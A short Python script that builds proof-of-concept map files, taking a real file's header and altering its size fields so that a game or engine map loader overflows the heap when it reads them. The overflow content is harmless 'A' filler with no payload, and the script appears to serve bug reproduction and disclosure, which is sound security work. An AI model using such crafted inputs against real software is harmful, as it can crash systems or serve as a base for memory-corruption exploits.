#!/usr/bin/env python3
"""Build TINY, benign full .map files embodying the tag-loader candidates.
A real map = the 0x380 header (crafted) + file body.  Our PoCs read the
"section" from file offset +0x10 for size align128(+0x2d4); we make the file
just large enough to supply those bytes with a recognizable 0x41('A') filler.
NOT weaponized: the overflow *content* is benign filler; this is a parser input
that exercises the missing bound, not an exploit payload.
Usage: mk_map.py <real.map> <outdir>"""
import sys, struct, os

real=open(sys.argv[1],"rb").read(0x380)
outdir=sys.argv[2]; os.makedirs(outdir,exist_ok=True)
ALIGN=lambda v:((v|0x7f)+1)&0xffffffff if (v&0x7f) else v&0xffffffff

def craft(mut):
    b=bytearray(real[:0x380])
    for off,val in mut.items(): struct.pack_into("<i",b,off,val)
    return bytes(b)

def build(name, mut, note):
    hdr=craft(mut)
    off10 = struct.unpack_from("<i",hdr,0x10)[0] & 0xffffffff
    d2d4  = struct.unpack_from("<i",hdr,0x2d4)[0] & 0xffffffff
    need  = off10 + ALIGN(d2d4)                    # bytes the first section read needs
    body_end = max(need, 0x380)
    buf=bytearray(hdr) + bytearray(b"\x41"*(body_end-0x380))
    # keep footer 'foot' consistency not required past 0x380 for the read; leave filler
    open(os.path.join(outdir,name),"wb").write(buf)
    print(f"  {name}: {len(buf)} bytes  (+10={off10:#x} +2d4={d2d4:#x} readneed={need:#x})  {note}")

f1c = struct.unpack_from("<I",real,0x1c)[0] & ~1
# oob1: alloc 0x1000, read 0x4000 @ +0x1000 -> +0x4000 overrun. file ~0x4000.
build("poc_oob1.map", {0x1c:f1c,0x14:0x0,0x2d0:0x1000,0x2d4:0x4000,0x10:0x0},
      "alloc=0x1000 read=0x4000 -> 0x4000 heap overflow")
# oob1b-small: realistic V=0x3200000 but shrink +0x14, modest +0x2d4=0x20000 at +0x10=0
build("poc_oob1b_small.map", {0x1c:f1c,0x14:0x1000,0x2d0:0x3200000,0x2d4:0x20000,0x10:0x0},
      "alloc=0x3201000 read=0x20000 @ +0x3200000 -> 0x1f000 overrun (file stays tiny)")
